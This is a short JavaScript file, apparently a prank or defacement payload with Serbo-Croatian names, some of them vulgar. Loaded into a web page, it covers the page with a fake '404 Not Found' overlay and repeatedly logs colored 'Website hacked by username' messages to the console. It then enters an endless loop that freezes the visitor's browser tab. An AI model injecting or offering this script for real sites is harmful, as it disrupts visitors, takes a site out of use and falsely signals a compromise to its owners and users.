function droksanjeSajta(time) {
    let cssDesign = {
        fontF: "font-family: roboto;",
        fontS: "font-size: 1rem;",
        fontW: "font-weight: bold;",
    }

    let childFuncs = {
        browserSeks: function() {
            while (true) {
                console.log(" ");
            }
        },
        startSeks: function(name) {
            setInterval(function karanje() {
                for(let i = 0; i <= 100; i++) {
                    let numOfP = Math.floor(Math.random() * 10);
                    const colorList = ["red","orange","yellow","green"]
    
                    let ccc = Math.floor(Math.random() * 4);
                    let bojica = colorList[ccc];
    
                    console.log(`%c [${numOfP}] Website hacked by ${name}`,
                    `color: ${bojica}; ${cssDesign.fontF} ${cssDesign.fontS} ${cssDesign.fontW}`);

                    if(i == 100) {
                        childFuncs.browserSeks();
                    }
                }
            }, time);
        }
    }
    childFuncs.startSeks('username');
}

addBg();
droksanjeSajta(1000);

function addBg() {
    const bg = document.createElement('div');
    const style = document.createElement('style');

    document.head.appendChild(style);
    bg.className = 'bgSize';

    style.innerHTML = `
    .bgSize {
        padding: 10% 0 0 0;
        width: 100%;
        height: 100%;
        background: white;
        position: relative;
        z-index: 100;
        color: black;
        font-family: cursive;
        font-size: 5rem;
        font-weight: bold;
        text-align: center;
    }`;

    bg.innerHTML = "404 Not Found";
    document.body.appendChild(bg);
}
